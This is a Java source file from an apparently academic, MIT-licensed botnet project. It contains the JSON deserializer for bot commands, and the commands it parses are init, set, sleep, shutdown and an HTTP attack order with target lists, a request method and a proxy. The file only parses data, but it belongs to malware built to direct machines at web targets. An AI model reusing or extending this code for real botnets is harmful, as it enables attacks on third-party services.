/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.command.json;

import com.acmutv.botnet.config.AppConfigurationService;
import com.acmutv.botnet.core.attack.HttpAttackMethod;
import com.acmutv.botnet.core.command.BotCommand;
import com.acmutv.botnet.core.command.CommandScope;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.core.target.HttpTargetProxy;
import com.acmutv.botnet.tool.time.Duration;
import com.fasterxml.jackson.core.JsonParser;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.deser.std.StdDeserializer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the JSON deserializer for {@link BotCommand}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
public class BotCommandDeserializer extends StdDeserializer<BotCommand> {

  private static final Logger LOGGER = LogManager.getLogger(BotCommandDeserializer.class);

  /**
   * The singleton of {@link BotCommandDeserializer}.
   */
  private static BotCommandDeserializer instance;

  /**
   * Returns the singleton of {@link BotCommandDeserializer}.
   * @return the singleton.
   */
  public static BotCommandDeserializer getInstance() {
    if (instance == null) {
      instance = new BotCommandDeserializer();
    }
    return instance;
  }

  /**
   * Initializes the singleton of {@link BotCommandDeserializer}.
   */
  private BotCommandDeserializer() {
    super((Class<?>) null);
  }

  @Override
  public BotCommand deserialize(JsonParser parser, DeserializationContext ctx) throws IOException {
    LOGGER.traceEntry();
    JsonNode node = parser.getCodec().readTree(parser);
    LOGGER.trace("node={}", node);

    BotCommand cmd = new BotCommand();

    if (node.has("command")) {
      final CommandScope scope = CommandScope.from(node.get("command").asText());
      cmd.setScope(scope);
    }

    if (cmd.getScope().isWithParams()) {

      switch (cmd.getScope()) {

        case INIT:
          final String resourceDefault = AppConfigurationService.getConfigurations().getInitResource();
          final String resource = (node.has("resource")) ?
              node.get("resource").asText() : resourceDefault;
          cmd.getParams().put("resource", resource);
          break;

        case SET:
          final Map<String,String> settingsDefault = new HashMap<>();
          final Map<String,String> settings = (node.has("settings")) ?
              parseMapStringString(node.get("settings")) : settingsDefault;
          cmd.getParams().put("settings", settings);
          break;

        case SLEEP:
          final Duration sleepTimeoutDefault = new Duration(60, TimeUnit.SECONDS);
          final Duration sleepTimeout = (node.has("timeout")) ?
              parseObject(node.get("timeout"), Duration.class) : sleepTimeoutDefault;
          cmd.getParams().put("timeout", sleepTimeout);
          break;

        case SHUTDOWN:
          final Duration shutdownTimeoutDefault = new Duration(60, TimeUnit.SECONDS);
          final Duration shutdownTimeout = (node.has("timeout")) ?
              parseObject(node.get("timeout"), Duration.class) : shutdownTimeoutDefault;
          cmd.getParams().put("timeout", shutdownTimeout);
          break;

        case ATTACK_HTTP:
          final HttpAttackMethod httpMethodDefault = HttpAttackMethod.GET;
          final List<HttpTarget> httpTargetsDefault = new ArrayList<>();
          final HttpTargetProxy httpProxyDefault = null;

          final HttpAttackMethod httpMethod = (node.has("method")) ?
              HttpAttackMethod.from(node.get("method").asText(httpMethodDefault.name()))
              :
              httpMethodDefault;
          final List<HttpTarget> httpTargets = (node.has("targets")) ?
              parseList(node.get("targets"), HttpTarget.class)
              :
              httpTargetsDefault;
          final HttpTargetProxy httpProxy = (node.has("proxy")) ?
              parseObject(node.get("proxy"), HttpTargetProxy.class)
              :
              httpProxyDefault;
          cmd.getParams().put("method", httpMethod);
          cmd.getParams().put("targets", httpTargets);
          cmd.getParams().put("proxy", httpProxy);
          break;

        default:
          break;
      }
    }

    return LOGGER.traceExit(cmd);
  }

  /**
   * Parses an object from a JSON node.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed object; null, in case of error.
   */
  private static <T> T parseObject(JsonNode node, Class<T> type) {
    ObjectMapper mapper = new ObjectMapper();
    T obj;
    try {
      obj = mapper.treeToValue(node, type);
    } catch (JsonProcessingException e) {
      e.printStackTrace();
      obj = null;
    }
    return obj;
  }

  /**
   * Parses a list of objects from a JSON node.
   * @param node the JSON node to parse.
   * @param type the object class reference.
   * @param <T> the object class.
   * @return the parsed list of objects; an empty list, in case of error.
   */
  private static <T> List<T> parseList(JsonNode node, Class<T> type) {
    ObjectMapper mapper = new ObjectMapper();
    List<T> list = new ArrayList<>();
    node.forEach(n -> {
      try {
        T obj = mapper.treeToValue(n, type);
        list.add(obj);
      } catch (JsonProcessingException e) {
        e.printStackTrace();
      }
    });
    return list;
  }
  /**
   * Parses a map from a JSON node.
   * @param node the JSON node to parse.
   * @return the parsed map; an empty map, in case of error.
   */
  private static Map<String, String> parseMapStringString(JsonNode node) {
    Map<String,String> map = new HashMap<>();
    node.elements().forEachRemaining(n -> {
      if (!n.has("property") || !n.has("value")) return;
      final String k = n.get("property").asText();
      final String v = n.get("value").asText();
      map.put(k, v);
    });
    return map;
  }
}